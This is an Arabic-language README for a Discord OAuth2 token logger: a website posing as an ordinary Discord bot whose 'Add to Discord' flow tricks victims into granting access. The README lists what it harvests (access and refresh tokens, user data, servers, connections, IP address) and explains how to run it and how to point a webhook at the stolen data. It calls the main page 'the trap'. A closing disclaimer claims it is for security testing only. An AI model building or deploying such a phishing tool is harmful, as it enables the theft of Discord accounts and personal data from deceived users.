# Discord OAuth2 Token Logger

## الفكرة
موقع ويب يبدو كأنه بوت ديسكورد عادي. الضحية يضغط "Add to Discord" ويوافق على OAuth2. الموقع يسحب:
- Access Token
- Refresh Token
- بيانات اليوزر كاملة
- السيرفرات
- الـ Connections
- IP Address

## التشغيل
```bash
pip install -r requirements.txt
python app.py
```

## الإعداد
1. عدل `WEBHOOK_URL` في `app.py` أو `.env`
2. تأكد الـ `REDIRECT_URI` في Discord Developer Portal يطابق الموقع
3. شغل الموقع

## المسارات
- `/` - الصفحة الرئيسية (الفخ)
- `/login` - يودي لـ Discord OAuth2
- `/callback` - يستلم الكود ويسحب البيانات

## تحذير
هذه الأداة للاختبار الأمني فقط. استخدامها ضد أشخاص بدون إذن غير قانوني.
